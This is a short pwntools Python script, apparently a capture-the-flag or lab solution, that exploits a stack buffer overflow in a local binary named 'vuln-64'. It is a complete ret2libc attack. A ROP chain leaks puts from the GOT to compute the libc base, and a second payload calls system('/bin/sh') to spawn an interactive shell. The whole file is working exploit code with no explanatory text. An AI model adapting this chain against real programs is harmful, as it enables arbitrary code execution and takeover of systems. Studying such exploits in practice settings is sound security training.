from pwn import *

elf = context.binary = ELF("./vuln-64")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = elf.libc
context.arch = "amd64"

p = process()

# context.log_level = "debug"

padding = 0x20 + 8
POP_RDI_RET = next(elf.search(asm("pop rdi; ret")))
RET = next(elf.search(asm("ret")))

log.info(f"POP_RDI_RET: {hex(POP_RDI_RET)}")
log.info(f"RET: {hex(RET)}")

payload = (
    b"A" * padding
    + p64(POP_RDI_RET)
    + p64(elf.got["puts"])
    + p64(elf.plt["puts"])
    + p64(elf.symbols["_start"])
)
p.recvline()
p.sendline(payload)
puts_leak = p.recv(6)

puts_leak = u64(puts_leak.ljust(8, b"\x00"))
libc.address = puts_leak - libc.symbols["puts"]
bin_sh = next(libc.search(b"/bin/sh\x00"))


log.info(f"puts leak: {hex(puts_leak)}")
log.info(f"libc base: {hex(libc.address)}")
log.info(f"bin_sh: {hex(bin_sh)}")
log.info(f"system: {hex(libc.symbols['system'])}")
log.info(f"_exit: {hex(libc.symbols['_exit'])}")
log.info(f"POP_RDI_RET: {hex(POP_RDI_RET)}")

payload = (
    b"A" * padding
    + p64(POP_RDI_RET)
    + p64(bin_sh)
    + p64(RET)  # align stack
    + p64(libc.symbols["system"])
    + p64(POP_RDI_RET)
    + p64(69)
    + p64(libc.symbols["_exit"])
)
p.sendlineafter(b"Come get me\n", payload)
p.interactive()
